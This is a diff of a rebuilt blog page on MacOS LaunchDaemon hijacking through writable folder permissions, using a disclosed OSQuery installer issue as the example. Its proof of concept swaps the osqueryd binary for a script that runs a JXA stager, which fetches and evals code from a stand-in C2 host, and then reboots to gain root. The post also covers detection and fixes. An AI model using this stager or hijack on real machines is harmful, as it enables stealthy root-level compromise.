@@ -10,10 +10,10 @@
 <meta name="keywords" content="" />
 <meta name="description" content="LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique. It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.
 I first spotted this issue affecting the OSQuery installer but went looking and found multiple other products with the same problem. This isn&rsquo;t a novel technique (it&rsquo;s briefly mentioned in T1543.004) but I was surprised to find it so rarely talked about.
-Example &ndash; Hijacking the OSQuery LaunchDaemon  #callout { background: var(--code-bg); padding: 1.">
+Example &ndash; Hijacking the OSQuery LaunchDaemon 😇 I&rsquo;ve already disclosed this issue to the OSQuery team and they kindly let me use it as an example in this post.">
 <meta name="author" content="Bradley Kemp">
 <link rel="canonical" href="https://bradleyjkemp.dev/post/launchdaemon-hijacking/" />
-<link href="https://bradleyjkemp.dev/assets/css/stylesheet.min.fafc3735bf4bc905437d0238e86406b02e0bbb0ada2c500ded4346cadd0dcda8.css" integrity="sha256-&#43;vw3Nb9LyQVDfQI46GQGsC4LuwraLFAN7UNGyt0Nzag=" rel="preload stylesheet"
+<link href="https://bradleyjkemp.dev/assets/css/stylesheet.min.9a4593a5a89e410d1a25cdfc488efc6a779d0657c40a4d8122f6b14bd12a3a41.css" integrity="sha256-mkWTpaieQQ0aJc38SI78anedBlfECk2BIvaxS9EqOkE=" rel="preload stylesheet"
     as="style">
 
 <link rel="icon" href="https://bradleyjkemp.dev/favicon.ico">
@@ -23,7 +23,7 @@ Example &ndash; Hijacking the OSQuery LaunchDaemon  #callout { background: var(-
 <link rel="mask-icon" href="https://bradleyjkemp.dev/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<meta name="generator" content="Hugo 0.80.0" />
+<meta name="generator" content="Hugo 0.109.0">
 <link rel="webmention" href="https://webmention.io/bradleyjkemp.dev/webmention" />
 <link rel="pingback" href="https://webmention.io/bradleyjkemp.dev/xmlrpc" />
 
@@ -67,7 +67,7 @@ Example &ndash; Hijacking the OSQuery LaunchDaemon  #callout { background: var(-
 <meta property="og:title" content="LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions" />
 <meta property="og:description" content="LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique. It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.
 I first spotted this issue affecting the OSQuery installer but went looking and found multiple other products with the same problem. This isn&rsquo;t a novel technique (it&rsquo;s briefly mentioned in T1543.004) but I was surprised to find it so rarely talked about.
-Example &ndash; Hijacking the OSQuery LaunchDaemon  #callout { background: var(--code-bg); padding: 1." />
+Example &ndash; Hijacking the OSQuery LaunchDaemon 😇 I&rsquo;ve already disclosed this issue to the OSQuery team and they kindly let me use it as an example in this post." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://bradleyjkemp.dev/post/launchdaemon-hijacking/" />
 <meta property="og:image" content="https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh.png" /><meta property="article:published_time" content="2021-05-10T00:00:00+00:00" />
@@ -77,7 +77,7 @@ Example &ndash; Hijacking the OSQuery LaunchDaemon  #callout { background: var(-
 <meta name="twitter:title" content="LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions"/>
 <meta name="twitter:description" content="LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique. It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.
 I first spotted this issue affecting the OSQuery installer but went looking and found multiple other products with the same problem. This isn&rsquo;t a novel technique (it&rsquo;s briefly mentioned in T1543.004) but I was surprised to find it so rarely talked about.
-Example &ndash; Hijacking the OSQuery LaunchDaemon  #callout { background: var(--code-bg); padding: 1."/>
+Example &ndash; Hijacking the OSQuery LaunchDaemon 😇 I&rsquo;ve already disclosed this issue to the OSQuery team and they kindly let me use it as an example in this post."/>
 
 <script type="application/ld+json">
 {
@@ -89,8 +89,8 @@ Example &ndash; Hijacking the OSQuery LaunchDaemon  #callout { background: var(-
   "keywords": [
     
   ],
-  "articleBody": "LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique. It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.\nI first spotted this issue affecting the OSQuery installer but went looking and found multiple other products with the same problem. This isn’t a novel technique (it’s briefly mentioned in T1543.004) but I was surprised to find it so rarely talked about.\nExample – Hijacking the OSQuery LaunchDaemon  #callout { background: var(--code-bg); padding: 1.5em 1.25em; border-radius: 3px; display: flex; flex-direction: row; margin-bottom: 20px; } #callout-inner { margin-left: 1em; } @media (max-width: 767px) { #callout { padding: 1.5em 0.75em 1.5em 0.6em; } #callout-inner { margin-left: 0.5em; } }  😇 I’ve already disclosed this issue to the OSQuery team and they kindly let me use it as an example in this post. A fix will hopefully be coming in a future release 🤞🏻   What is OSQuery? OSQuery is a monitoring tool that lets you remotely query the configuration and status of hosts using SQL. On MacOS, this is accomplished by running a LaunchDaemon on each laptop that syncs with a backend server.\nThe OSQuery installer creates a binary called /usr/local/bin/osqueryd and sets up a LaunchDaemon via /Library/LaunchDaemons/com.facebook.osqueryd.plist:\n KeepAlive  Disabled  Label com.facebook.osqueryd ProgramArguments  /usr/local/bin/osqueryd --flagfile=/private/var/osquery/osquery.flags  RunAtLoad  ThrottleInterval 60   Which, at a high level, looks like this: On a default MacOS install, this is perfectly safe:\n /Library/LaunchDaemons/com.facebook.osqueryd.plist can’t be tampered with to run anything other than /usr/local/bin/osqueryd ✅ /usr/local/bin/osqueryd can’t be modified to include malicious code ✅  How is this exploitable? While /usr/local/bin is a secure folder to store binaries on a default MacOS install, this isn’t the case on many real-world systems.\nMany people install a package manager called Homebrew which, during installation, makes the /usr/local/bin folder writable by the current user (even if they’re not an admin). This subtly changes the picture: Now, although a normal user can’t modify the /usr/local/bin/osqueryd file directly, they can simply replace it!\nBecause /usr/local/bin is globally writeable, any user on the system has permission to:\n Delete files in this folder—for example, the real osqueryd binary. Create files in this folder—for example, some malware named osqueryd.  Proof of concept # 1. Move the original osqueryd binary somewhere else mv /usr/local/bin/osqueryd /usr/local/bin/.osquery/osqueryd # 2. Create our replacement osqueryd cat /usr/local/bin/osqueryd #!/bin/bash # Firstly start the original osqueryd binary in the background # (so no one notices we've hijacked it) /usr/local/bin/.osquery/osqueryd \u0026 # Then run our malicious payload e.g. a JXA stager /usr/bin/osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('https://my-c2.com')),$.NSUTF8StringEncoding)));\" EOF # 3. Reboot the machine. Our payload will be started as root on start-up  osascript -e 'tell application \"System Events\" to restart' This short script demonstrates a complete LaunchDaemon Hijack:\n Firstly it moves the real osqueryd binary to a hidden folder. It then creates a payload in /usr/local/bin/osqueryd that:  Starts the original osqueryd binary in the background (to help avoid anyone noticing the LaunchDaemon has been hijacked). Runs a backdoor.   Finally it reboots the machine to force the OSQuery LaunchDaemon to restart. This step is optional but otherwise we won’t get code execution until the user restarts themselves.  Once exploited, the system looks like this: Exploiting this in general OSQuery is not alone in being vulnerable to this technique. The change in /usr/local/bin permissions during a Homebrew install is a particularly common cause of this issue.\nA secure (non-hijackable) LaunchDaemon needs to look like this: All four of those padlocks needs to be correctly present to avoid being vulnerable. A non-root user mustn’t be able to:\n Modify any file within /Library/LaunchDaemons Create files within /Library/LaunchDaemons Modify any binary referenced by /Library/LaunchDaemons/*.plist Create binaries within a folder referenced by /Library/LaunchDaemons/*.plist  Developers and admins are pretty good at getting points 1–3 right. It’s point 4 where problems are most likely to arise—folder permissions are just a bit more confusing than file permissions.\nWhat to do about LaunchDaemon Hijacking For red teamers LaunchDaemon Hijacking can be a particularly sneaky way to achieve both persistence and privilege escalation on MacOS. Because it doesn’t create or modify any of the *.plist files in /Library/LaunchDaemons or /Library/LaunchAgents, it’s not going to trigger any detection rules looking for changes in these folders.\nIf you’re willing to wait until the user reboots the machine themselves, this is a way to gain root privileges without doing something as obvious as phishing the user for their laptop password.\nOf course, this technique can also apply to a user’s personal LaunchAgents (configured in /Users/username/Library/LaunchAgents). These are very likely run binaries that can be hijacked to achieve persistence (though you won’t gain any additional privileges this way).\nFor blue teamers Protective measures Thankfully, LaunchDaemon Hijacking opportunities are fairly easy to detect and fix.\nAll you need to look for is any /Library/LaunchDaemons/*.plist or /Library/LaunchAgents/*.plist file where either:\n The binary being launched is writeable by non-root users. The binary being launched is in a directory writeable by non-root users.  The fix is simply to fix the file permissions or move the binary to a more secure location.\n #callout { background: var(--code-bg); padding: 1.5em 1.25em; border-radius: 3px; display: flex; flex-direction: row; margin-bottom: 20px; } #callout-inner { margin-left: 1em; } @media (max-width: 767px) { #callout { padding: 1.5em 0.75em 1.5em 0.6em; } #callout-inner { margin-left: 0.5em; } }  🔍 Here is a small script that logs LaunchDaemons which are hijackable by the current user: launchdaemon_hijacking.go\n⚠️ Beware, this script doesn’t detect more nuanced cases. For example, where a LaunchDaemon runs bash with a hijackable script as an argument.\n  Detective measures If you can’t fix a LaunchDaemon, your best bet is probably File Integrity Monitoring.\nBecause this technique requires replacing the LaunchDaemon binary, you’ll be able to detect it by regularly computing file checksums and comparing against known-good values.\nA pretty good way to monitor the integrity of LaunchDaemons is actually OSQuery itself…\n",
-  "wordCount" : "986",
+  "articleBody": "LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique. It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.\nI first spotted this issue affecting the OSQuery installer but went looking and found multiple other products with the same problem. This isn’t a novel technique (it’s briefly mentioned in T1543.004) but I was surprised to find it so rarely talked about.\nExample – Hijacking the OSQuery LaunchDaemon 😇 I’ve already disclosed this issue to the OSQuery team and they kindly let me use it as an example in this post. A fix will hopefully be coming in a future release 🤞🏻 What is OSQuery? OSQuery is a monitoring tool that lets you remotely query the configuration and status of hosts using SQL. On MacOS, this is accomplished by running a LaunchDaemon on each laptop that syncs with a backend server.\nThe OSQuery installer creates a binary called /usr/local/bin/osqueryd and sets up a LaunchDaemon via /Library/LaunchDaemons/com.facebook.osqueryd.plist:\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"\u003e KeepAlive Disabled Label com.facebook.osqueryd ProgramArguments /usr/local/bin/osqueryd --flagfile=/private/var/osquery/osquery.flags RunAtLoad ThrottleInterval 60 Which, at a high level, looks like this: On a default MacOS install, this is perfectly safe:\n/Library/LaunchDaemons/com.facebook.osqueryd.plist can’t be tampered with to run anything other than /usr/local/bin/osqueryd ✅ /usr/local/bin/osqueryd can’t be modified to include malicious code ✅ How is this exploitable? While /usr/local/bin is a secure folder to store binaries on a default MacOS install, this isn’t the case on many real-world systems.\nMany people install a package manager called Homebrew which, during installation, makes the /usr/local/bin folder writable by the current user (even if they’re not an admin). This subtly changes the picture: Now, although a normal user can’t modify the /usr/local/bin/osqueryd file directly, they can simply replace it!\nBecause /usr/local/bin is globally writeable, any user on the system has permission to:\nDelete files in this folder—for example, the real osqueryd binary. Create files in this folder—for example, some malware named osqueryd. Proof of concept # 1. Move the original osqueryd binary somewhere else mv /usr/local/bin/osqueryd /usr/local/bin/.osquery/osqueryd # 2. Create our replacement osqueryd cat \u003c\u003c EOF \u003e /usr/local/bin/osqueryd #!/bin/bash # Firstly start the original osqueryd binary in the background # (so no one notices we've hijacked it) /usr/local/bin/.osquery/osqueryd \u0026 # Then run our malicious payload e.g. a JXA stager /usr/bin/osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('https://my-c2.com')),$.NSUTF8StringEncoding)));\" EOF # 3. Reboot the machine. Our payload will be started as root on start-up osascript -e 'tell application \"System Events\" to restart' This short script demonstrates a complete LaunchDaemon Hijack:\nFirstly it moves the real osqueryd binary to a hidden folder. It then creates a payload in /usr/local/bin/osqueryd that: Starts the original osqueryd binary in the background (to help avoid anyone noticing the LaunchDaemon has been hijacked). Runs a backdoor. Finally it reboots the machine to force the OSQuery LaunchDaemon to restart. This step is optional but otherwise we won’t get code execution until the user restarts themselves. Once exploited, the system looks like this: Exploiting this in general OSQuery is not alone in being vulnerable to this technique. The change in /usr/local/bin permissions during a Homebrew install is a particularly common cause of this issue.\nA secure (non-hijackable) LaunchDaemon needs to look like this: All four of those padlocks needs to be correctly present to avoid being vulnerable. A non-root user mustn’t be able to:\nModify any file within /Library/LaunchDaemons Create files within /Library/LaunchDaemons Modify any binary referenced by /Library/LaunchDaemons/*.plist Create binaries within a folder referenced by /Library/LaunchDaemons/*.plist Developers and admins are pretty good at getting points 1–3 right. It’s point 4 where problems are most likely to arise—folder permissions are just a bit more confusing than file permissions.\nWhat to do about LaunchDaemon Hijacking For red teamers LaunchDaemon Hijacking can be a particularly sneaky way to achieve both persistence and privilege escalation on MacOS. Because it doesn’t create or modify any of the *.plist files in /Library/LaunchDaemons or /Library/LaunchAgents, it’s not going to trigger any detection rules looking for changes in these folders.\nIf you’re willing to wait until the user reboots the machine themselves, this is a way to gain root privileges without doing something as obvious as phishing the user for their laptop password.\nOf course, this technique can also apply to a user’s personal LaunchAgents (configured in /Users/username/Library/LaunchAgents). These are very likely run binaries that can be hijacked to achieve persistence (though you won’t gain any additional privileges this way).\nFor blue teamers Protective measures Thankfully, LaunchDaemon Hijacking opportunities are fairly easy to detect and fix.\nAll you need to look for is any /Library/LaunchDaemons/*.plist or /Library/LaunchAgents/*.plist file where either:\nThe binary being launched is writeable by non-root users. The binary being launched is in a directory writeable by non-root users. The fix is simply to fix the file permissions or move the binary to a more secure location.\n🔍 Here is a small script that logs LaunchDaemons which are hijackable by the current user: launchdaemon_hijacking.go\n⚠️ Beware, this script doesn’t detect more nuanced cases. For example, where a LaunchDaemon runs bash with a hijackable script as an argument.\nDetective measures If you can’t fix a LaunchDaemon, your best bet is probably File Integrity Monitoring.\nBecause this technique requires replacing the LaunchDaemon binary, you’ll be able to detect it by regularly computing file checksums and comparing against known-good values.\nA pretty good way to monitor the integrity of LaunchDaemons is actually OSQuery itself…\n",
+  "wordCount" : "908",
   "inLanguage": "en",
   "image":"https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh.png","datePublished": "2021-05-10T00:00:00Z",
   "dateModified": "2021-05-10T00:00:00Z",
@@ -184,7 +184,7 @@ May 10, 2021&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Bradley Kemp
     </div>
   </header> 
 <figure class="entry-cover">
-        <img srcset="https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh_huc37364f64ae7875fa79f0cdb7a0e7712_363719_360x0_resize_box_2.png 360w ,https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh_huc37364f64ae7875fa79f0cdb7a0e7712_363719_480x0_resize_box_2.png 480w ,https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh_huc37364f64ae7875fa79f0cdb7a0e7712_363719_720x0_resize_box_2.png 720w ,https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh_huc37364f64ae7875fa79f0cdb7a0e7712_363719_1080x0_resize_box_2.png 1080w ,https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh.png 1180w"
+        <img srcset="https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh_huc37364f64ae7875fa79f0cdb7a0e7712_363719_360x0_resize_box_3.png 360w ,https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh_huc37364f64ae7875fa79f0cdb7a0e7712_363719_480x0_resize_box_3.png 480w ,https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh_huc37364f64ae7875fa79f0cdb7a0e7712_363719_720x0_resize_box_3.png 720w ,https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh_huc37364f64ae7875fa79f0cdb7a0e7712_363719_1080x0_resize_box_3.png 1080w ,https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh.png 1180w"
             sizes="(min-width: 768px) 720px, 100vw" src="https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh.png" alt="" />
         
 </figure>
@@ -227,9 +227,9 @@ This isn&rsquo;t a novel technique (it&rsquo;s briefly mentioned in <a href="htt
 <p><a href="https://osquery.io">OSQuery</a> is a monitoring tool that lets you remotely query the configuration and status of hosts using SQL.
 On MacOS, this is accomplished by running a LaunchDaemon on each laptop that syncs with a backend server.</p>
 <p>The OSQuery installer creates a binary called <code>/usr/local/bin/osqueryd</code> and sets up a LaunchDaemon via <code>/Library/LaunchDaemons/com.facebook.osqueryd.plist</code>:</p>
-<pre><code class="language-plist" data-lang="plist">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
-&lt;plist version=&quot;1.0&quot;&gt;
+<pre tabindex="0"><code class="language-plist" data-lang="plist">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;
+&lt;plist version=&#34;1.0&#34;&gt;
 &lt;dict&gt;
   &lt;key&gt;KeepAlive&lt;/key&gt;
   &lt;true/&gt;
@@ -267,23 +267,23 @@ This subtly changes the picture:
 <li>Create files in this folder&mdash;for example, some malware named <code>osqueryd</code>.</li>
 </ul>
 <h3 id="proof-of-concept">Proof of concept<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 1. Move the original osqueryd binary somewhere else</span>
-mv /usr/local/bin/osqueryd /usr/local/bin/.osquery/osqueryd
-
-<span style="color:#75715e"># 2. Create our replacement osqueryd</span>
-cat <span style="color:#e6db74">&lt;&lt; EOF &gt; /usr/local/bin/osqueryd
-</span><span style="color:#e6db74">  #!/bin/bash
-</span><span style="color:#e6db74">  # Firstly start the original osqueryd binary in the background
-</span><span style="color:#e6db74">  # (so no one notices we&#39;ve hijacked it)
-</span><span style="color:#e6db74">  /usr/local/bin/.osquery/osqueryd &amp;
-</span><span style="color:#e6db74">
-</span><span style="color:#e6db74">  # Then run our malicious payload e.g. a JXA stager
-</span><span style="color:#e6db74">  /usr/bin/osascript -l JavaScript -e &#34;eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(&#39;https://my-c2.com&#39;)),$.NSUTF8StringEncoding)));&#34;
-</span><span style="color:#e6db74">EOF</span>
-
-<span style="color:#75715e"># 3. Reboot the machine. Our payload will be started as root on start-up </span>
-osascript -e <span style="color:#e6db74">&#39;tell application &#34;System Events&#34; to restart&#39;</span> 
-</code></pre></div><p>This short script demonstrates a complete LaunchDaemon Hijack:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 1. Move the original osqueryd binary somewhere else</span>
+</span></span><span style="display:flex;"><span>mv /usr/local/bin/osqueryd /usr/local/bin/.osquery/osqueryd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. Create our replacement osqueryd</span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt; EOF &gt; /usr/local/bin/osqueryd
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  #!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # Firstly start the original osqueryd binary in the background
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # (so no one notices we&#39;ve hijacked it)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  /usr/local/bin/.osquery/osqueryd &amp;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # Then run our malicious payload e.g. a JXA stager
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  /usr/bin/osascript -l JavaScript -e &#34;eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(&#39;https://my-c2.com&#39;)),$.NSUTF8StringEncoding)));&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. Reboot the machine. Our payload will be started as root on start-up </span>
+</span></span><span style="display:flex;"><span>osascript -e <span style="color:#e6db74">&#39;tell application &#34;System Events&#34; to restart&#39;</span> 
+</span></span></code></pre></div><p>This short script demonstrates a complete LaunchDaemon Hijack:</p>
 <ol>
 <li>Firstly it moves the real <code>osqueryd</code> binary to a hidden folder.</li>
 <li>It then creates a payload in <code>/usr/local/bin/osqueryd</code> that:
@@ -462,7 +462,7 @@ These are very likely run binaries that can be hijacked to achieve persistence
     <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
     <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
 </svg></a><a href="https://phish.report" target="_blank" rel="noopener noreferrer me"
-        title="Phish.report"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        title="Phish.Report"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
     stroke-linecap="round" stroke-linejoin="round">
     <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
     <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
@@ -527,7 +527,7 @@ These are very likely run binaries that can be hijacked to achieve persistence
 
 </article>
     </main><footer class="footer">
-    <span>&copy; 2022 <a href="https://bradleyjkemp.dev">bradleyjkemp</a></span>
+    <span>&copy; 2023 <a href="https://bradleyjkemp.dev">bradleyjkemp</a></span>
     <span>&middot;</span>
     <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
     <span>&middot;</span>
@@ -543,7 +543,7 @@ These are very likely run binaries that can be hijacked to achieve persistence
 
 
 
-<script defer src="https://bradleyjkemp.dev/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js" integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w="
+<script defer src="https://bradleyjkemp.dev/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
     onload="hljs.initHighlightingOnLoad();"></script>
 <script>
     window.onload = function () {
